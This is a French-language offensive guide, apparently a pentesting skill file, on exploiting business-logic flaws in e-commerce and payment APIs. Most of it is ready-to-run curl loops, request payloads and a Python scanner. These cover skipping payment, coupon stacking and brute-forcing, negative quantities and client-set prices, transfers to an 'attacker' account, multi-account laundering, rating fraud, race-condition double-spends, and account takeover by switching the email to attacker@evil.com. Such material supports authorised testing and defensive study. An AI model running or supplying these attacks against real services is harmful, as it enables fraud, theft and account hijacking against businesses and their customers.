---
name: api-business-logic-attacks
description: Guide complet d'exploitation des failles de logique métier dans les API — workflow bypass, coupon abuse, balance manipulation, multi-step fraud, voting manipulation, et race conditions économiques
category: cybersecurite
---

# API Business Logic Attacks — Guide Avancé

## Introduction

Les failles de logique métier sont les plus difficiles à détecter automatiquement. Elles exploitent la manière dont l'application manipule les données et les flux, pas les bugs techniques. Chaque endpoint API révèle une brique du business model.

## 1. Workflow Bypass

### 1.1 Step Skipping

```bash
# Flux normal: panier → adresse → paiement → confirmation
# Flux bypassé: panier → confirmation (sauter paiement)

# 1. Créer le panier
POST /api/v1/cart
{"productId": 1, "quantity": 1}

# 2. Sauter le paiement, appeler la confirmation
POST /api/v1/orders/confirm
{"cartId": "cart_123"}

# 3. Vérifier si la commande est créée sans paiement
GET /api/v1/orders/latest
```

### 1.2 Status Manipulation

```bash
# Forcer un statut qui n'est pas atteignable normalement
PATCH /api/v1/orders/123
{"status": "shipped"}       # ← sauter la validation
{"status": "delivered"}     # ← sauter l'expédition
{"status": "completed"}     # ← sauter la livraison
{"orderStatus": "paid"}     # ← si nom différent
{"paymentStatus": "confirmed"}  # ← champ séparé

# Ajouter le statut manquant
POST /api/v1/orders/123/payments
{"amount": 0, "status": "completed"}  # paiement à 0€
```

### 1.3 Sequential ID Manipulation

```bash
# Découvrir le workflow en suivant les IDs
GET /api/v1/checkout/steps
→ {"steps": [{"id": 1, "name": "cart"}, {"id": 2, "name": "shipping"},
             {"id": 3, "name": "payment"}, {"id": 4, "name": "review"}]}

# Appeler une étape dans le désordre
POST /api/v1/checkout/step/4
{"cartId": "cart_123"}
```

## 2. Coupon / Discount Abuse

### 2.1 Coupon Stacking

```bash
# Appliquer plusieurs coupons sur la même commande
POST /api/v1/cart/coupon
{"code": "WELCOME10"}  # -10%
POST /api/v1/cart/coupon
{"code": "FREESHIP"}   # free shipping
POST /api/v1/cart/coupon
{"code": "NEW50"}      # -50%
POST /api/v1/cart/coupon
{"code": "FIRSTORDER"} # -20%

# Stacking non limité
GET /api/v1/cart
→ {"total": 0, "appliedCoupons": ["WELCOME10", "FREESHIP", "NEW50", "FIRSTORDER"]}
```

### 2.2 Coupon Reuse

```bash
# Utiliser le même coupon N fois
for i in $(seq 1 100); do
  curl -X POST https://api.target.com/api/v1/orders \
    -H "Authorization: Bearer <token_$i>" \
    -d '{"productId": 1, "coupon": "WELCOME10"}'
done

# Créer N comptes, utiliser le même coupon sur chacun
for i in $(seq 1 100); do
  curl -X POST https://api.target.com/api/v1/auth/signup \
    -d '{"email":"user'$i'@test.com","password":"pass123"}'
  curl -X POST https://api.target.com/api/v1/orders \
    -H "Authorization: Bearer <token_$i>" \
    -d '{"productId": 1, "coupon": "WELCOME10"}'
done
```

### 2.3 Coupon Negative Price

```bash
# Coupon qui rend le prix négatif
POST /api/v1/cart/checkout
{"coupon": "NEGATIVE100", "quantity": 1}
# Si le prix est 50€ et coupon -100€, total = -50€

# Si le système crédite le compte
POST /api/v1/cart/checkout
{"coupon": "FREEGIFT", "quantity": 999}
# Quantité négative
POST /api/v1/cart/checkout
{"quantity": -1, "coupon": "WELCOME10"}
```

### 2.4 Coupon Bruteforce

```bash
# Bruteforce de codes promo
# Format: PREFIX-XXXXX
for code in $(seq 0 99999); do
  curl -X POST https://api.target.com/api/v1/cart/coupon \
    -d '{"code":"SUMMER-'$(printf "%05d" $code)'"}'
done

# Découverte de patterns de coupons
# NEW10, NEW20, NEW30, ... NEW100
for i in $(seq 10 10 100); do
  curl -s https://api.target.com/api/v1/cart/coupon \
    -d '{"code":"NEW'$i'"}'
done
```

## 3. Balance / Credit Manipulation

### 3.1 Negative Quantity

```bash
# Quantité négative = crédit
POST /api/v1/orders
{"productId": 1, "quantity": -100, "price": 10}
# Total = -100 * 10 = -1000 € → crédité sur le compte

# Annuler en achetant positif
POST /api/v1/orders
{"productId": 1, "quantity": -1}
POST /api/v1/orders
{"productId": 1, "quantity": -1}
# Répéter → solde négatif infini
```

### 3.2 Price Manipulation

```bash
# Changer le prix dans la requête
POST /api/v1/cart/add
{"productId": 1, "price": 0.01}  # prix modifié
{"productId": 1, "price": 0}      # gratuit
{"productId": 1, "price": -100}   # crédité

# Prix dans le body vs prix en base (différence)
POST /api/v1/checkout
{"productId": 1, "quantity": 1, "unitPrice": 0.01}
```

### 3.3 Integer Overflow

```bash
# Overflow de solde
POST /api/v1/transfer
{"amount": 999999999999999999999999999999999999, "to": "attacker"}
# Si le système utilise un int non signé, overflow → solde négatif
# Ou overflow → 0 et bypass

# Float precision
POST /api/v1/transfer
{"amount": 0.0000000000000000000000000000000000000001}
# Arrondi → 0, mais transféré 1 fois
```

### 3.4 Rounding Exploitation

```bash
# Rounding down → accumulation
# Si 0.01€ est arrondi à 0 pour chaque transaction
# 1 000 000 transactions de 0.01€ = 0€ débité
for i in $(seq 1 1000000); do
  curl -X POST https://api.target.com/api/v1/transfer \
    -d '{"amount": 0.001, "to": "attacker"}'
done

# Rounding error → micro-transactions
# Prix 9.99€, arrondi à 10€ → 0.01€ de différence
# 10 000 transactions = 100€ de profit
```

## 4. Multi-Step Fraud

### 4.1 Split Transaction

```bash
# Diviser une transaction pour bypasser les limites
# Limite de transfert: 1000€
# À transférer: 5000€
for i in $(seq 1 5); do
  curl -X POST https://api.target.com/api/v1/transfer \
    -d '{"amount": 1000, "to": "attacker"}'
done
# 5 × 1000€ = 5000€
```

### 4.2 Multi-Account Laundering

```bash
# Laundering via comptes multiples
# Compte A → B → C → D → E → Attacker
for account in B C D E; do
  curl -X POST https://api.target.com/api/v1/transfer \
    -H "Authorization: Bearer <token_$account>" \
    -d '{"amount": 200, "from": "prev_account", "to": "'$account'"}'
done
```

### 4.3 Time-Based Abuse

```bash
# Profiter de la fenêtre entre débit et crédit
# 1. Transférer 1000€ vers un compte externe
# 2. Avant que le débit soit confirmé, dépenser le solde
curl -X POST https://api.target.com/api/v1/transfer \
  -d '{"amount": 1000, "to": "external"}'
# (Pas de confirmation de débit)
curl -X POST https://api.target.com/api/v1/orders \
  -d '{"productId": 1, "quantity": 1}'  # solde encore disponible
```

## 5. Voting / Rating Manipulation

### 5.1 Vote Unlimited

```bash
# Voter plusieurs fois
for i in $(seq 1 1000); do
  curl -X POST https://api.target.com/api/v1/products/1/rate \
    -d '{"rating": 5}'
done

# Bypass via rotation de token
for i in $(seq 1 1000); do
  curl -X POST https://api.target.com/api/v1/auth/guest-session
  # Récupérer le token guest
  curl -X POST https://api.target.com/api/v1/products/1/rate \
    -H "Authorization: Bearer <guest_token>" \
    -d '{"rating": 1}'
done
```

### 5.2 Rating Manipulation

```bash
# Changer la note d'un concurrent
POST /api/v1/products/2/rate
{"rating": 1, "review": "Bad product"}

# Vote pour son propre produit
for i in $(seq 1 1000); do
  curl -X POST https://api.target.com/api/v1/products/1/rate \
    -H "Authorization: Bearer <token_$i>" \
    -d '{"rating": 5, "review": "Amazing!"}'
done
```

## 6. Race Condition Économique

### 6.1 Coupon Race

```bash
# Appliquer le même coupon en parallèle
# Si le coupon est à usage unique mais pas atomique
for i in $(seq 1 20); do
  curl -X POST https://api.target.com/api/v1/cart/coupon \
    -d '{"code":"ONETIME100"}' &
done
wait
```

### 6.2 Balance Double-Spend

```bash
# Dépenser le même solde deux fois
# Turbo Intruder: single-packet attack
for i in $(seq 1 10); do
  curl -X POST https://api.target.com/api/v1/orders \
    -d '{"productId": 1, "quantity": 1}' &
  curl -X POST https://api.target.com/api/v1/transfer \
    -d '{"amount": 100, "to": "attacker"}' &
done
wait
```

## 7. Inventory / Stock Manipulation

### 7.1 Negative Stock

```bash
# Acheter plus que le stock disponible
POST /api/v1/orders
{"productId": 1, "quantity": 999999}
# Si pas de vérification de stock → commande validée
# Stock négatif = problème de comptabilité

# Over-sell
POST /api/v1/orders
{"productId": 1, "quantity": 1}
# 100 personnes en même temps, si stock = 50
# 50 commandes acceptées, 50 refusées (ou toutes acceptées si race)
```

### 7.2 Free Item via Bundle

```bash
# Bundle avec quantité négative
POST /api/v1/cart/bundle
{"items": [
  {"productId": 1, "quantity": 1},   # produit payant 100€
  {"productId": 2, "quantity": 1},   # gratuit offert
  {"productId": 2, "quantity": -1}   # annuler le gratuit = ne pas l'avoir
]}
# Ou bundle avec prix modifié
POST /api/v1/cart/bundle
{"items": [
  {"productId": 1, "quantity": 1, "price": 0},
  {"productId": 2, "quantity": 1, "price": 0}
]}
```

## 8. Account Takeover via Business Logic

### 8.1 Email Change Without Verification

```bash
# Changer l'email sans vérification
PUT /api/v1/account/email
{"email": "attacker@evil.com", "verify": false}
PUT /api/v1/account/email
{"email": "attacker@evil.com", "skipVerification": true}
PUT /api/v1/account/email
{"email": "attacker@evil.com", "currentPassword": "known"}
```

### 8.2 Phone Number Swap

```bash
# Changer le numéro de téléphone pour recevoir les OTP
PUT /api/v1/account/phone
{"phone": "+33612345678", "verifySms": false}
# → Les OTP de reset/2FA arrivent chez l'attaquant
```

## Script Automatisé

```python
#!/usr/bin/env python3
"""Scanner de failles de logique métier API."""
import requests
import threading
from concurrent.futures import ThreadPoolExecutor

BASE = "https://api.target.com"

def test_negative_quantity():
    """Teste les quantités négatives."""
    for qty in [-1, -10, -100, -999]:
        r = requests.post(BASE + "/api/v1/orders", json={
            "productId": 1, "quantity": qty
        })
        if r.status_code in [200, 201]:
            print(f"[NEGATIVE QTY] Quantité {qty} acceptée: {r.text[:100]}")

def test_coupon_stacking():
    """Teste le stacking de coupons."""
    coupons = ["WELCOME10", "NEW50", "FREESHIP", "FIRSTORDER", "VIP20"]
    for c in coupons:
        r = requests.post(BASE + "/api/v1/cart/coupon", json={"code": c})
        if r.status_code == 200:
            print(f"[COUPON] {c} accepté")
    # Vérifier le total
    r = requests.get(BASE + "/api/v1/cart")
    if r.status_code == 200:
        total = r.json().get("total", 0)
        if total <= 0:
            print(f"[FREE CART] Total = {total} — panier gratuit !")

def race_condition_test(endpoint, payload, n=20):
    """Teste les race conditions."""
    def req():
        requests.post(BASE + endpoint, json=payload)
    with ThreadPoolExecutor(max_workers=n) as ex:
        futures = [ex.submit(req) for _ in range(n)]
    print(f"[RACE] {n} requêtes envoyées à {endpoint}")

if __name__ == "__main__":
    test_negative_quantity()
    test_coupon_stacking()
    race_condition_test("/api/v1/cart/coupon", {"code": "ONETIME100"})
```

## Checklist

- [ ] Workflow step skipping (sauter paiement)
- [ ] Status manipulation (forçage de statut)
- [ ] Coupon stacking illimité
- [ ] Coupon reuse multi-compte
- [ ] Coupon negative price
- [ ] Coupon bruteforce
- [ ] Negative quantity (crédit)
- [ ] Price manipulation dans body
- [ ] Integer overflow
- [ ] Rounding exploitation
- [ ] Split transaction (bypass limite)
- [ ] Multi-account laundering
- [ ] Time-based abuse (débit vs crédit)
- [ ] Vote unlimited
- [ ] Rating manipulation
- [ ] Race condition (coupon, balance)
- [ ] Double-spend
- [ ] Negative stock / over-sell
- [ ] Bundle manipulation
- [ ] Email change sans vérification
- [ ] Phone swap (OTP hijack)

## Ressources

- **OWASP API4: Unrestricted Resource Consumption** : https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/
- **OWASP API6: Unrestricted Access to Sensitive Business Flows** : https://owasp.org/API-Security/editions/2023/en/0xa6-unrestricted-access-to-sensitive-business-flows/
- **HackTricks Business Logic** : https://book.hacktricks.wiki/en/pentesting-web/business-logic/index.html
- **PortSwigger Business Logic** : https://portswigger.net/web-security/logic-flaws